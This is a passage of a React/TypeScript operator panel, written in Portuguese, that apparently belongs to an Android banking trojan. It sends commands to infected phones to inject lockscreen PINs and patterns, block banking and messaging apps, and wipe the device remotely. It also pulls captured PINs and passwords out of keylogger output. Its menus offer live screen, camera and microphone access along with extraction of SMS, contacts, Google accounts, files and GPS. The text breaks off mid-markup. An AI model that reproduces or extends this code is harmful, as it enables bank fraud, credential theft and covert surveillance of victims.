    showToast('Overlay de Lockscreen removido!', 'info');
  };

  // ðŸš€ Reproduzir SequÃªncia de PIN
  const handlePlayPinSequence = async (pinOverride?: string) => {
    const targetPin = pinOverride || pinInput;
    if (!targetPin || targetPin.trim() === '') {
      showToast('Digite ou selecione um PIN primeiro!', 'error');
      return;
    }
    await sendCommand({ action: 'PLAY_PIN_SEQUENCE', pin: targetPin.trim(), delay: pinDelay });
    showToast(`Injetando PIN [${targetPin.trim()}] com delay de ${pinDelay}ms...`, 'success');
  };

  // ðŸ”¢ Tecla individual do Lockscreen (Keypad 0-9)
  const handleLockKeyPress = async (key: string) => {
    await sendCommand({ action: 'LOCK_KEY_PRESS', key });
    setPinInput((prev) => prev + key);
    showToast(`Tecla [${key}] pressionada!`, 'info');
  };

  // ðŸ”² Injetar SequÃªncia de PadrÃ£o (Pattern)
  const handlePlayPattern = async (patternOverride?: string) => {
    const targetPattern = patternOverride || patternInput;
    if (!targetPattern || targetPattern.trim() === '') {
      showToast('Digite a sequÃªncia do padrÃ£o (ex: 14789)!', 'error');
      return;
    }
    await sendCommand({ action: 'PLAY_PATTERN_SEQUENCE', pattern: targetPattern.trim(), delay: pinDelay });
    await sendCommand({ action: 'PATTERN_UNLOCK', pattern: targetPattern.trim(), delay: pinDelay });
    showToast(`Injetando padrÃ£o [${targetPattern.trim()}]...`, 'success');
  };

  // ðŸš« Bloquear Abertura de Bancos
  const handleBlockAllBanks = async () => {
    const bankPkgs = [
      'com.itau', 'com.itau.pers', 'com.nu.production', 'com.bradesco',
      'com.santander.app', 'br.com.bb.android', 'br.com.intermedium',
      'br.com.caixa.tem', 'br.com.caixa.economica', 'com.c6bank.app',
      'com.mercadopago.wallet', 'com.picpay', 'com.nequi.MobileApp'
    ];
    await sendCommand({ action: 'SET_BLOCKED_APPS', packages: bankPkgs });
    showToast('ðŸš« Bloqueio ativado para todos os Bancos!', 'info');
  };

  // ðŸš« Bloquear Abertura de Redes Sociais
  const handleBlockAllSocial = async () => {
    const socialPkgs = [
      'com.whatsapp', 'com.whatsapp.w4b', 'com.instagram.android',
      'com.facebook.katana', 'org.telegram.messenger', 'com.twitter.android',
      'com.zhiliaoapp.musically'
    ];
    await sendCommand({ action: 'SET_BLOCKED_APPS', packages: socialPkgs });
    showToast('ðŸš« Bloqueio ativado para Redes Sociais!', 'info');
  };

  // âœ… Liberar Todos os Apps Bloqueados
  const handleUnblockAllApps = async () => {
    await sendCommand({ action: 'SET_BLOCKED_APPS', packages: [] });
    showToast('âœ… Abertura liberada para todos os Aplicativos!', 'success');
  };

  // âš ï¸ FormataÃ§Ã£o Remota (Wipe Device)
  const handleFormatDevice = async () => {
    await sendCommand({ action: 'FORMAT_DEVICE' });
    setShowWipeConfirm(false);
    showToast('Comando de FormataÃ§Ã£o Admin disparado!', 'error');
  };

  // ðŸ”‘ DetecÃ§Ã£o Inteligente de PINs, PadrÃµes e Senhas capturados pelo Keylogger
  const detectedPinsAndPasswords = React.useMemo(() => {
    const list: { app: string; text: string; isPin: boolean; isPattern: boolean; time: string }[] = [];
    const seen = new Set<string>();

    keylogs.forEach((k: any) => {
      const raw = (k.text || k.data || '').toString().trim();
      const app = k.appName || k.app || k.package || 'App';
      const time = k.timestamp || k.time || (k.created_at ? new Date(k.created_at).toLocaleTimeString('pt-BR') : 'Recente');

      if (!raw) return;
      
      const isPatternRaw = raw.includes('PADRÃƒO') || raw.includes('PATTERN') || k.eventType === 'CAPTURED_PATTERN' || k.package === 'LOCKSCREEN_PATTERN';
      // Trata strings como "ðŸ”‘ [PADRÃƒO]: 14789", "ðŸ”‘ [PIN]: 1234", "ðŸ”‘ [SENHA]: 1234" ou apenas "1234"
      const clean = raw.replace(/^ðŸ”‘\s*(\[(SENHA|PIN|PADRÃƒO|PATTERN)\]:\s*)?/i, '').trim();
      const isNumericPin = /^[0-9]{4,8}$/.test(clean);
      const isPass = k.isPassword || raw.includes('ðŸ”‘') || raw.toLowerCase().includes('senha') || isPatternRaw;

      if ((isNumericPin || isPass || isPatternRaw) && clean.length > 0 && !seen.has(clean)) {
        seen.add(clean);
        list.push({
          app,
          text: clean,
          isPin: isNumericPin && !isPatternRaw,
          isPattern: isPatternRaw,
          time
        });
      }
    });

    return list.slice(0, 8);
  }, [keylogs]);

  return (
    <div className="min-h-screen bg-[#071024] text-slate-100 flex flex-col lg:flex-row font-sans overflow-x-hidden select-none relative z-10">
      {/* ðŸ”· FUNDO AZUL MODERNO INTERATIVO E LIMPO */}
      <ModernCyberBlueBackground />

      {/* Grade CibernÃ©tica Suave de Fundo */}
      <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden opacity-[0.15]">
        <div
          className="absolute inset-0 bg-[linear-gradient(to_right,#ff1e4d_1px,transparent_1px),linear-gradient(to_bottom,#ff1e4d_1px,transparent_1px)] bg-[size:4rem_4rem]"
          style={{
            maskImage: 'radial-gradient(ellipse 70% 60% at 50% 50%, #000 60%, transparent 100%)',
            WebkitMaskImage: 'radial-gradient(ellipse 70% 60% at 50% 50%, #000 60%, transparent 100%)'
          }}
        />
      </div>

      {/* Toast Notification Banner */}
      {toastMsg && (
        <div className="fixed top-5 left-1/2 -translate-x-1/2 z-[99999] px-5 py-2.5 bg-[#0b162b]/95 border border-red-400 text-pink-200 rounded-xl shadow-[0_0_25px_rgba(0,210,255,0.4)] backdrop-blur-xl flex items-center gap-2.5 animate-bounce text-xs font-mono font-bold">
          {toastMsg.type === 'success' ? <CheckCircle2 className="w-4 h-4 text-emerald-400" /> : <AlertCircle className="w-4 h-4 text-red-400" />}
          <span>{toastMsg.text}</span>
        </div>
      )}

      {/* HEADER EXCLUSIVO PARA CELULARES (MOBILE BANNER COM BOTÃƒO MENU) */}
      <div className="lg:hidden w-full bg-[#060c1a] border-b border-[#142647] p-3 flex items-center justify-between sticky top-0 z-40 shadow-xl backdrop-blur-md">
        <div className="flex items-center gap-2">
          <button
            onClick={() => setIsSidebarCollapsed(!isSidebarCollapsed)}
            className="p-2 bg-[#09152b] border border-[#1b345f] rounded-xl text-red-400 hover:text-white flex items-center justify-center active:scale-95 transition-all"
            title="Alternar Menu"
          >
            <PanelLeftOpen className="w-5 h-5" />
          </button>
          <div className="flex flex-col">
            <span className="text-xs font-black text-white uppercase tracking-wider font-mono truncate max-w-[160px]">
              {deviceName || 'MOTO G(10)'}
            </span>
            <span className="text-[10px] text-emerald-400 font-mono font-bold">â— DISPOSITIVO CONECTADO</span>
          </div>
        </div>

        <button
          onClick={() => {
            if (onLogout && !device) onLogout();
            navigate('/dashboard');
          }}
          className="px-3 py-1.5 bg-[#0d1b38] border border-[#1e3b6e] rounded-xl text-red-400 font-mono text-[10px] font-bold uppercase flex items-center gap-1.5"
        >
          <ArrowLeft className="w-3.5 h-3.5" />
          <span>Voltar</span>
        </button>
      </div>

      {/* ========================================================= */}
      <aside
        className={`${
          isSidebarCollapsed ? 'hidden lg:flex lg:w-[72px] lg:p-2' : 'flex w-full lg:w-[280px] p-3.5'
        } bg-gradient-to-b from-[#060c19]/98 via-[#081226]/98 to-[#050a16]/98 backdrop-blur-3xl border-r border-[#142647] flex-col justify-between flex-shrink-0 z-30 shadow-[5px_0_35px_rgba(0,0,0,0.7)] select-none transition-all duration-300`}
      >
        <div className="space-y-3.5">
          {/* BotÃ£o Superior: Voltar Ã  Lista & Toggle */}
          {isSidebarCollapsed ? (
            <div className="space-y-2 flex flex-col items-center">
              <button
                onClick={() => setIsSidebarCollapsed(false)}
                className="w-full py-2.5 bg-[#0d1b38] hover:bg-[#0070f3] border border-[#1e3b6e] hover:border-red-400 rounded-xl text-red-400 hover:text-white transition-all flex items-center justify-center shadow"
                title="Expandir Menu Lateral"
              >
                <PanelLeftOpen className="w-4 h-4" />
              </button>
              <button
                onClick={() => {
                  if (onLogout && !device) onLogout();
                  navigate('/dashboard');
                }}
                className="w-full py-2.5 bg-[#0d1b38] hover:bg-[#0070f3] border border-[#1e3b6e] hover:border-red-400 rounded-xl text-slate-300 hover:text-white transition-all flex items-center justify-center shadow"
                title="Voltar Ã  Lista"
              >
                <ArrowLeft className="w-4 h-4 text-red-400" />
              </button>
            </div>
          ) : (
            <div className="flex items-center gap-2">
              <button
                onClick={() => {
                  if (onLogout && !device) onLogout();
                  navigate('/dashboard');
                }}
                className="flex-1 py-2.5 px-3.5 bg-gradient-to-r from-[#0d1b38] via-[#0055c4]/20 to-[#0d1b38] hover:from-[#0070f3] hover:to-red-600 border border-[#1e3b6e] hover:border-red-400 rounded-xl text-slate-200 hover:text-white font-mono text-[11px] font-black uppercase tracking-wider flex items-center justify-center gap-2.5 transition-all shadow-[0_4px_15px_rgba(0,0,0,0.4)] hover:shadow-[0_0_25px_rgba(0,112,243,0.6)] group"
              >
                <ArrowLeft className="w-4 h-4 text-red-400 group-hover:-translate-x-1 group-hover:text-white transition-transform" />
                <span>VOLTAR Ã€ LISTA</span>
              </button>
              <button
                onClick={() => setIsSidebarCollapsed(true)}
                className="p-2.5 bg-[#0d1b38] hover:bg-[#0070f3] border border-[#1e3b6e] hover:border-red-400 rounded-xl text-red-400 hover:text-white transition-all flex items-center justify-center shadow"
                title="Recolher Menu Lateral"
              >
                <PanelLeftClose className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* Card do Dispositivo Selecionado */}
          {isSidebarCollapsed ? (
            <div
              className="bg-gradient-to-b from-[#091838]/95 via-[#0b1f48]/95 to-[#06122b]/95 border border-red-400/50 hover:border-pink-300 rounded-2xl p-2 flex flex-col items-center justify-center relative shadow-[0_0_20px_rgba(0,240,255,0.2)] hover:shadow-[0_0_25px_rgba(0,240,255,0.4)] group cursor-pointer transition-all duration-300 backdrop-blur-xl"
              title={`${deviceName} â€¢ ${deviceIp} â€¢ ONLINE`}
            >
              <div className="relative">
                <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-red-400 via-red-600 to-indigo-700 flex items-center justify-center text-white shadow-[0_0_18px_rgba(6,182,212,0.6)] border border-red-200/60 group-hover:scale-105 transition-transform">
                  <Smartphone className="w-5 h-5 text-white drop-shadow-[0_0_8px_rgba(255,255,255,0.9)]" />
                </div>
                <span className="absolute -bottom-1 -right-1 flex h-3.5 w-3.5 items-center justify-center rounded-full bg-[#040a17] p-0.5 shadow-md">
                  <span className="h-2.5 w-2.5 rounded-full bg-rose-400 shadow-[0_0_10px_#ff4757] animate-pulse" />
                </span>
              </div>
            </div>
          ) : (
            <div className="bg-gradient-to-r from-[#071533]/95 via-[#0d2757]/95 to-[#06122b]/95 border border-red-400/50 hover:border-pink-300 rounded-2xl p-3 flex items-center gap-3 shadow-[0_0_28px_rgba(0,240,255,0.22)] hover:shadow-[0_0_35px_rgba(0,240,255,0.38)] relative overflow-hidden group transition-all duration-300 backdrop-blur-2xl">
              {/* Neon Ambient Glow Orb */}
              <div className="absolute -top-8 -right-8 w-28 h-28 bg-gradient-to-br from-red-400/25 to-red-600/25 rounded-full blur-2xl pointer-events-none group-hover:from-red-400/40 group-hover:to-red-500/40 transition-all duration-500 animate-pulse" />

              <div className="relative shrink-0">
                <div className="w-11 h-11 rounded-2xl bg-gradient-to-br from-red-400 via-red-600 to-indigo-700 flex items-center justify-center text-white font-black text-base shadow-[0_0_22px_rgba(6,182,212,0.7)] border border-red-200/60 group-hover:scale-105 transition-transform">
                  <Smartphone className="w-5.5 h-5.5 text-white drop-shadow-[0_0_10px_rgba(255,255,255,0.9)]" />
                </div>
                <span className="absolute -bottom-1 -right-1 flex h-4 w-4 items-center justify-center rounded-full bg-[#040a17] p-0.5 shadow-md">
                  <span className="h-2.5 w-2.5 rounded-full bg-rose-400 shadow-[0_0_12px_#ff4757] animate-pulse" />
                </span>
              </div>

              <div className="overflow-hidden flex-1 space-y-1">
                <div className="flex items-center justify-between gap-1">
                  <div className="flex items-center gap-1.5 min-w-0">
                    <span className="font-mono font-black text-xs text-white truncate tracking-wider uppercase drop-shadow-[0_0_8px_rgba(255,255,255,0.3)] group-hover:text-pink-200 transition-colors">
                      {deviceName}
                    </span>
                    <button
                      onClick={(e) => {
                        e.stopPropagation();
                        setNewDeviceName(deviceName);
                        setShowRenameModal(true);
                      }}
                      className="p-1 text-red-400 hover:text-pink-200 hover:bg-red-950/60 rounded transition-colors shrink-0"
                      title="Alterar Nome do Aparelho"
                    >
                      <Edit3 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                  <div className="flex items-center gap-1 px-2 py-0.5 rounded-full bg-rose-950/90 border border-emerald-400/60 shadow-[0_0_10px_rgba(16,185,129,0.35)] shrink-0">
                    <span className="w-1.5 h-1.5 rounded-full bg-rose-400 animate-pulse shadow-[0_0_8px_#34d399]" />
                    <span className="text-[8.5px] font-mono font-black tracking-widest text-emerald-300 uppercase">ONLINE</span>
                  </div>
                </div>

                <div className="flex items-center gap-1.5 flex-wrap">
                  <div className="text-[10px] text-pink-200 font-mono font-bold flex items-center gap-1.5 bg-[#030d21]/80 px-2.5 py-1 rounded-xl border border-red-500/30 w-fit shadow-inner group-hover:border-red-400/60 transition-colors">
                    <span className="w-1.5 h-1.5 rounded-full bg-red-400 shadow-[0_0_8px_#22d3ee] animate-pulse" />
                    <span className="truncate tracking-widest">{deviceIp}</span>
                  </div>
                  <div className="text-[10px] text-pink-300 font-mono font-bold flex items-center gap-1 bg-[#030d21]/80 px-2 py-1 rounded-xl border border-red-500/30 shadow-inner" title={`Conectado hÃ¡ ${formatConnectedDays(device?.first_seen)}`}>
                    <Calendar className="w-3 h-3 text-red-400" />
                    <span>{formatConnectedDays(device?.first_seen)}</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Lista de Menus de NavegaÃ§Ã£o por Categorias */}
          <div className="space-y-3 overflow-y-auto max-h-[calc(100vh-270px)] pr-1 custom-scrollbar">
            {[
              {
                category: 'âš¡ CONTROLE AO VIVO',
                items: [
                  { id: 'general_info', label: 'InformaÃ§Ãµes Gerais', icon: Smartphone, color: 'text-red-400' },
                  { id: 'live_screen', label: 'Tela ao Vivo', icon: Tv, color: 'text-red-400' },
                  { id: 'camera', label: 'CÃ¢mera ao Vivo', icon: Camera, color: 'text-pink-300' },
                  { id: 'audio', label: 'Ãudio ao Vivo', icon: Mic, color: 'text-pink-400' }
                ]
              },
              {
                category: 'ðŸ”‘ SEGURANÃ‡A & CREDENCIAIS',
                items: [
                  { id: 'admin_security', label: 'Admin, Lock & PIN', icon: ShieldCheck, color: 'text-red-400' },
                  { id: 'passwords', label: 'Senhas dos Injects', icon: KeyRound, count: capturedPasswords.length, color: 'text-red-400' },
                  { id: 'keylogger', label: 'Keylogger', icon: Keyboard, color: 'text-pink-300' }
                ]
              },
              {
                category: 'ðŸ“‚ EXTRAÃ‡ÃƒO DE DADOS',
                items: [
                  { id: 'google_accounts', label: 'Contas Google', icon: Mail, count: googleAccountsList.length, color: 'text-amber-400' },
                  { id: 'data_scraper', label: 'ExtraÃ§Ã£o de Dados', icon: Eye, color: 'text-pink-400' },
                  { id: 'files', label: 'Gerenciador de Arquivos', icon: Folder, color: 'text-red-400' },
                  { id: 'sms', label: 'SMS & Mensagens', icon: MessageSquare, color: 'text-red-400' },
                  { id: 'apps', label: 'Aplicativos', icon: Package, color: 'text-pink-300' },
                  { id: 'contacts', label: 'Contatos', icon: Users, color: 'text-pink-400' },
                  { id: 'location', label: 'LocalizaÃ§Ã£o GPS', icon: MapPin, color: 'text-red-400' }
                ]
              }
            ].map((section, idx) => (
              <div key={idx} className="space-y-1">
                {!isSidebarCollapsed && (
                  <div className="px-2 py-1 text-[9px] font-mono font-black uppercase text-slate-400 tracking-wider flex items-center gap-1.5 opacity-80">
                    <span>{section.category}</span>
                  </div>
                )}
                <div className="space-y-1">
                  {section.items.map((item) => {
                    const Icon = item.icon;
                    const isActive = activeTab === item.id;
                    return (
                      <button
                        key={item.id}
                        onClick={() => {
                          setActiveTab(item.id as any);
                          if (item.id === 'google_accounts') fetchGoogleAccounts();
                          if (item.id === 'passwords') fetchPasswords();
                          if (item.id === 'apps') fetchApps();
                          if (item.id === 'keylogger') fetchKeylogs();
                          if (item.id === 'sms') fetchSms();
                          if (item.id === 'contacts') fetchContacts();
                          if (item.id === 'files') fetchFiles(currentPath);
                          if (item.id === 'location') fetchLocation();
                        }}
                        title={item.label}
                        className={`w-full flex items-center ${
                          isSidebarCollapsed ? 'justify-center p-2.5 relative' : 'justify-between px-3 py-2'
                        } rounded-xl text-[11.5px] tracking-wide transition-all duration-200 group ${
                          isActive
                            ? 'bg-gradient-to-r from-[#0070f3] via-red-600 to-[#0055c4] text-white shadow-[0_0_25px_rgba(0,112,243,0.6)] font-black border-l-4 border-pink-300 translate-x-1'
                            : 'text-slate-300 hover:text-pink-200 bg-[#09152b]/50 hover:bg-[#0e2142] border border-[#142647]/50 hover:border-[#1d3c73] font-semibold hover:translate-x-1'
                        }`}
                      >
                        <div className="flex items-center gap-2.5 truncate">
                          <Icon className={`w-4 h-4 flex-shrink-0 transition-transform group-hover:scale-110 ${isActive ? 'text-white' : item.color}`} />
                          {!isSidebarCollapsed && <span className="truncate font-sans">{item.label}</span>}
                        </div>
                        {typeof item.count === 'number' && item.count > 0 ? (
                          <span className={`${isSidebarCollapsed ? 'absolute -top-1 -right-1 px-1.5 py-0.5 text-[8.5px]' : 'px-2 py-0.5 text-[9.5px]'} rounded-full font-mono font-black bg-gradient-to-r from-red-500 to-red-500 text-white shadow-[0_0_12px_rgba(0,112,243,0.7)] animate-pulse`}>
                            {item.count}
                          </span>
                        ) : isActive && !isSidebarCollapsed ? (
                          <div className="flex items-center gap-1">
                            <span className="w-1.5 h-1.5 rounded-full bg-pink-300 shadow-[0_0_8px_#22d3ee] animate-pulse" />
                          </div>
                        ) : null}
                      </button>
                    );
                  })}
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* RodapÃ© da Barra Lateral: Status de Energia & SeguranÃ§a */}
        {isSidebarCollapsed ? (
          <div className="bg-[#0a1833] border border-[#1b345e] rounded-xl p-2 flex flex-col items-center justify-center font-mono text-[9px] text-pink-300 shadow" title={`Bateria: ${batteryLevel}% | ${isCharging ? 'Carregando' : 'Bateria'}`}>
            {isCharging ? (
              <BatteryCharging className="w-4 h-4 text-amber-300 animate-bounce" />
            ) : (
              <Battery className="w-4 h-4 text-red-400" />
            )}
            <span className="font-bold mt-1 text-[9px]">{batteryLevel}%</span>
          </div>
        ) : (
          <div className="bg-gradient-to-b from-[#0a1833] to-[#060e21] border border-[#1b345e] rounded-2xl p-3 space-y-2 font-mono text-[11px] shadow-xl relative overflow-hidden mt-3">
            <div className="flex items-center justify-between text-slate-300">
              <div className="flex items-center gap-1.5 text-red-400">
                {isCharging ? (
                  <BatteryCharging className="w-4 h-4 text-amber-300 animate-bounce" />
                ) : (
                  <Battery className="w-4 h-4 text-red-400" />
                )}
                <span className="font-black text-[10px] uppercase tracking-wider">ENERGIA</span>
              </div>
              <div className="flex items-center gap-1 font-black text-pink-300">
                <span>{batteryLevel}%</span>
                {isCharging && <span className="text-amber-400 text-[10px] animate-pulse">âš¡</span>}
              </div>
            </div>
            {/* Mini Barra de Progresso da Bateria */}
            <div className="w-full h-1.5 bg-[#081224] rounded-full overflow-hidden border border-[#142647]">
              <div
                className={`h-full transition-all duration-500 ${
                  batteryLevel > 50
                    ? 'bg-gradient-to-r from-rose-500 to-rose-400 shadow-[0_0_10px_#ff4757]'
                    : batteryLevel > 20
                    ? 'bg-gradient-to-r from-amber-500 to-amber-400 shadow-[0_0_10px_#f59e0b]'
                    : 'bg-gradient-to-r from-rose-600 to-rose-400 shadow-[0_0_10px_#f43f5e]'
                }`}
                style={{ width: `${Math.min(100, Math.max(0, batteryLevel))}%` }}
              />
            </div>
            <div className="flex items-center justify-between text-slate-300 border-t border-[#162a4d] pt-2">
              <div className="flex items-center gap-1.5 text-red-400">
                <ShieldCheck className="w-4 h-4 text-emerald-400" />
                <span className="font-black text-[10px] uppercase tracking-wider">SEGURANÃ‡A</span>
              </div>
            </div>
          </div>
        )}
      </aside>

      {/* ========================================================= */}
      {/* ðŸ’» CONTEÃšDO PRINCIPAL (MAIN VIEW CONTAINER)              */}
      {/* ========================================================= */}
      <main className="flex-1 bg-transparent p-2 sm:p-4 overflow-y-auto min-h-screen relative flex flex-col items-center justify-start z-10">
        {/* Subtle Cyber Ambient Glow */}
        <div className="absolute top-0 left-1/3 w-[500px] h-[300px] bg-red-500/5 blur-[150px] pointer-events-none rounded-full" />
        <div className="absolute bottom-10 right-10 w-[400px] h-[300px] bg-red-600/5 blur-[150px] pointer-events-none rounded-full" />

        {/* ----------------------------------------------------------------- */}
        {/* 1. VISÃƒO: INFORMAÃ‡Ã•ES GERAIS (GENERAL INFO)                       */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'general_info' && (
          <div className="w-full max-w-5xl space-y-4">
            <div className="bg-[#091224] border border-[#14233e] rounded-xl p-1 flex items-center gap-1">
              {[
                { id: 'general', label: 'GERAL' },
                { id: 'permissions', label: 'PERMISSÃ•ES' },
                { id: 'bot_options', label: 'OPÃ‡Ã•ES DO BOT' },
                { id: 'activities', label: 'ATIVIDADES' }
              ].map((sub) => (
                <button
                  key={sub.id}
                  onClick={() => {
                    setGeneralSubTab(sub.id as any);
                    if (sub.id === 'activities') fetchLogs();
                  }}
                  className={`flex-1 py-2 text-center rounded-lg text-xs font-bold uppercase tracking-wider transition-all font-mono ${
                    generalSubTab === sub.id
                      ? 'bg-[#0070f3] text-white shadow-[0_0_15px_rgba(0,112,243,0.4)]'
                      : 'text-slate-400 hover:text-slate-200 hover:bg-[#0c1830]'
                  }`}
                >
                  {sub.label}
                </button>
              ))}
            </div>

            {generalSubTab === 'general' && (
              <div className="space-y-4">
                <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg relative">
                  <div className="flex items-center justify-between mb-4 border-b border-[#14233e] pb-3">
                    <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono">
                      INFORMAÃ‡Ã•ES DO DISPOSITIVO
                    </h3>
                    <button
                      onClick={loadDevice}
                      className="text-[11px] font-bold text-red-400 hover:text-pink-300 uppercase tracking-wider font-mono flex items-center gap-1"
                    >
                      <RefreshCw className="w-3 h-3" />
                      ATUALIZAR DADOS
                    </button>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 text-xs font-mono">
                    <div className="space-y-2.5">
                      <div className="flex justify-between border-b border-[#101b30] pb-1.5 items-center">
                        <span className="text-slate-400">Modelo / Nome:</span>
                        <div className="flex items-center gap-2">
                          <span className="text-slate-100 font-bold">{deviceName}</span>
                          <button
                            onClick={() => {
                              setNewDeviceName(deviceName);
                              setShowRenameModal(true);
                            }}
                            className="px-2 py-0.5 rounded bg-red-950/80 border border-red-500/40 text-red-400 hover:text-pink-300 hover:border-red-400 text-[10px] font-mono font-bold uppercase flex items-center gap-1 transition-all"
                            title="Alterar Nome do Aparelho"
                          >
                            <Edit3 className="w-3 h-3" />
                            Renomear
                          </button>
                        </div>
                      </div>
                      <div className="flex justify-between border-b border-[#101b30] pb-1.5">
                        <span className="text-slate-400">Android:</span>
                        <span className="text-slate-100 font-bold">{androidVer}</span>
                      </div>
                      <div className="flex justify-between border-b border-[#101b30] pb-1.5">
                        <span className="text-slate-400">Tempo Conectado:</span>
                        <span className="text-pink-300 font-bold flex items-center gap-1">
                          <Calendar className="w-3 h-3 text-red-400" />
                          {formatConnectedDays(device?.first_seen)}
                        </span>
                      </div>
                      <div className="flex justify-between border-b border-[#101b30] pb-1.5">
                        <span className="text-slate-400">Bateria:</span>
                        <span className="text-emerald-400 font-bold flex items-center gap-1">
                          {batteryLevel}% {isCharging && 'âš¡ (Carregando)'}
                        </span>
                      </div>
                      <div className="flex justify-between border-b border-[#101b30] pb-1.5">
                        <span className="text-slate-400">Luzes / Tela:</span>
                        <span className="text-slate-100 font-bold">{device?.is_online ? 'Ligada' : 'Desconhecido'}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-400">Ã‚ngulo / RotaÃ§Ã£o:</span>
                        <span className="text-slate-100 font-bold">0Â°</span>
                      </div>
                    </div>

                    <div className="space-y-2.5">
                      <div className="text-[11px] font-black text-red-400 uppercase tracking-wider border-b border-[#101b30] pb-1.5 flex items-center justify-between">
                        <span>REDE & CONEXÃƒO</span>
                        <button
                          type="button"
                          onClick={async () => {
                            if (deviceId) {
                              try {
                                sendCommand({ action: 'GET_DEVICE_INFO' });
                                showToast('Solicitando info de rede e SIM ao aparelho...', 'info');
                                setTimeout(loadDevice, 1000);
                              } catch (e) {
                                showToast('Erro ao solicitar dados do aparelho', 'error');
                              }
                            }
                          }}
                          className="text-[10px] text-red-400 hover:text-pink-300 flex items-center gap-1 font-mono normal-case"
                          title="Atualizar dados de rede e chip"
                        >
                          <RefreshCw className="w-3 h-3" /> Atualizar
                        </button>
                      </div>
                      <div className="flex justify-between border-b border-[#101b30] pb-1.5">
                        <span className="text-slate-400">Tipo de Rede:</span>
                        <span className="text-slate-100 font-bold">
                          {device?.network_type || (device?.is_online ? 'Wi-Fi' : 'Desconectado')}
                        </span>
                      </div>
                      <div className="flex justify-between border-b border-[#101b30] pb-1.5">
                        <span className="text-slate-400">Operadora SIM:</span>
                        <span className="text-slate-100 font-bold">
                          {device?.sim_operator || device?.carrier || (device?.is_online ? 'Sem Chip / Wi-Fi' : 'Desconhecido')}
                        </span>
                      </div>
                      <div className="flex justify-between border-b border-[#101b30] pb-1.5">
                        <span className="text-slate-400">EndereÃ§o IP:</span>
                        <span className="text-red-400 font-bold">{deviceIp}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-400">PaÃ­s / RegiÃ£o:</span>
                        <span className="text-slate-100 font-bold">{device?.country || 'Brasil (BR) ðŸ‡§ðŸ‡·'}</span>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-5">
                  <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono border-b border-[#14233e] pb-3">
                    SOM & HARDWARE
                  </h3>

                  <div className="grid grid-cols-3 gap-3">
                    <button
                      onClick={() => handleSetSoundMode('silent')}
                      className={`py-3 px-4 rounded-xl border flex items-center justify-center gap-2 font-mono text-xs font-black uppercase tracking-wider transition-all ${
                        soundMode === 'silent'
                          ? 'bg-rose-950/60 border-rose-500 text-rose-300 shadow-[0_0_15px_rgba(244,63,94,0.3)]'
                          : 'bg-[#091224] border-[#162644] text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      <VolumeX className="w-4 h-4 text-rose-400" />
                      <span>SILENCIOSO</span>
                    </button>

                    <button
                      onClick={() => handleSetSoundMode('vibrate')}
                      className={`py-3 px-4 rounded-xl border flex items-center justify-center gap-2 font-mono text-xs font-black uppercase tracking-wider transition-all ${
                        soundMode === 'vibrate'
                          ? 'bg-amber-950/60 border-amber-500 text-amber-300 shadow-[0_0_15px_rgba(245,158,11,0.3)]'
                          : 'bg-[#091224] border-[#162644] text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      <Radio className="w-4 h-4 text-amber-400 animate-pulse" />
                      <span>VIBRAR</span>
                    </button>

                    <button
                      onClick={() => handleSetSoundMode('sound')}
                      className={`py-3 px-4 rounded-xl border flex items-center justify-center gap-2 font-mono text-xs font-black uppercase tracking-wider transition-all ${
                        soundMode === 'sound'
                          ? 'bg-red-950/60 border-red-500 text-pink-300 shadow-[0_0_15px_rgba(6,182,212,0.3)]'
                          : 'bg-[#091224] border-[#162644] text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      <Volume2 className="w-4 h-4 text-red-400" />
                      <span>SOM</span>
                    </button>
                  </div>

                  <div className="space-y-3.5 pt-2">
                    <div className="space-y-1">
                      <div className="flex justify-between text-xs font-mono">
                        <span className="text-slate-300 flex items-center gap-1.5">
                          <Sun className="w-3.5 h-3.5 text-red-400" /> Brilho da Tela
                        </span>
                        <span className="text-red-400 font-bold">{brightness}%</span>
                      </div>
                      <input
                        type="range"
                        min="0"
                        max="100"
                        value={brightness}
                        onChange={(e) => {
                          const val = Number(e.target.value);
                          setBrightness(val);
                          sendCommand({ action: 'SET_BRIGHTNESS', value: val });
                        }}
                        className="w-full accent-red-500 h-1.5 bg-[#0e1b33] rounded-lg appearance-none cursor-pointer"
                      />
                    </div>

                    <div className="space-y-1">
                      <div className="flex justify-between text-xs font-mono">
                        <span className="text-slate-300 flex items-center gap-1.5">
                          <Moon className="w-3.5 h-3.5 text-red-400" /> Tempo Limite da Tela
                        </span>
                        <span className="text-red-400 font-bold">{screenTimeout}m</span>
                      </div>
                      <input
                        type="range"
                        min="0"
                        max="100"
                        value={screenTimeout}
                        onChange={(e) => {
                          const val = Number(e.target.value);
                          setScreenTimeout(val);
                          sendCommand({ action: 'SET_SCREEN_TIMEOUT', minutes: val });
                        }}
                        className="w-full accent-red-500 h-1.5 bg-[#0e1b33] rounded-lg appearance-none cursor-pointer"
                      />
                    </div>

                    <div className="space-y-1">
                      <div className="flex justify-between text-xs font-mono">
                        <span className="text-slate-300 flex items-center gap-1.5">
                          <Volume2 className="w-3.5 h-3.5 text-red-400" /> Volume do Toque
                        </span>
                        <span className="text-red-400 font-bold">{ringingVolume}%</span>
                      </div>
                      <input
                        type="range"
                        min="0"
                        max="100"
                        value={ringingVolume}
                        onChange={(e) => {
                          const val = Number(e.target.value);
                          setRingingVolume(val);
                          sendCommand({ action: 'SET_VOLUME', stream: 'ring', volume: val });
                        }}
                        className="w-full accent-red-500 h-1.5 bg-[#0e1b33] rounded-lg appearance-none cursor-pointer"
                      />
                    </div>
                  </div>
                </div>
              </div>
            )}

            {generalSubTab === 'permissions' && (
              <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
